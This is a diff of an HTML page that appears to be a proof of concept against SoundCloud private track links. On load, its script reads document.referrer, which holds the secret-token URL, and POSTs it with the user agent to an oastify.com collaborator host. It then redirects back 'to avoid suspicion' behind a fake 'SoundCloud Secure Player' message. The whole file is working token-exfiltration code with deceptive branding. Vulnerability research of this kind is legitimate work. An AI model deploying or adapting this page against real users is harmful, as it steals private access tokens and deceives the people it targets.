@@ -1,37 +1,37 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta name="referrer" content="unsafe-url">
-    <title>Connecting...</title>
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <title>Verifying... </title>
 </head>
 <body>
     <script>
-        // 1. Capture the Referrer via JS immediately on load
-        // This works because 'document.referrer' is available to JS 
-        // even if the HTTP header is stripped by the browser!
-        const capturedReferrer = document.referrer; 
-
-        const leak = {
-            status: "SUCCESS_PRIVATE_TOKEN_CAPTURED",
-            secret_url: capturedReferrer, 
-            ua: navigator.userAgent
+        // 1. Capture the data immediately
+        const capturedRef = document.referrer;
+        
+        // 2. Prepare the exfiltration payload
+        const report = {
+            alert: "PRIVATE_TOKEN_EXFILTRATED",
+            // This is the specific secret token we need
+            secret_url: capturedRef, 
+            ua: navigator.userAgent,
+            timestamp: new Date().toISOString()
         };
 
-        // 2. Send the captured JS variable to Oastify
+        // 3. Send to Oastify
         fetch('https://547icd6oajijfupu2oumfkb1xs3jranyc.oastify.com/exfiltrate', {
             method: 'POST',
             mode: 'no-cors',
-            body: JSON.stringify(leak)
+            body: JSON.stringify(report)
         });
 
-        // 3. Auto-redirect back to the track
+        // 4. Redirect back to avoid suspicion
         setTimeout(() => {
-            window.location.href = capturedReferrer || "https://soundcloud.com";
-        }, 1000);
+            window.location.href = capturedRef || "https://soundcloud.com/discover";
+        }, 1500);
     </script>
-    <div style="text-align:center; margin-top:100px; font-family:sans-serif;">
-        <h2>SoundCloud Secure Gateway</h2>
-        <p>Verifying your private access token...</p>
+    <div style="font-family: Arial; text-align: center; margin-top: 50px;">
+        <p>Loading SoundCloud Secure Player...</p>
     </div>
 </body>
 </html>
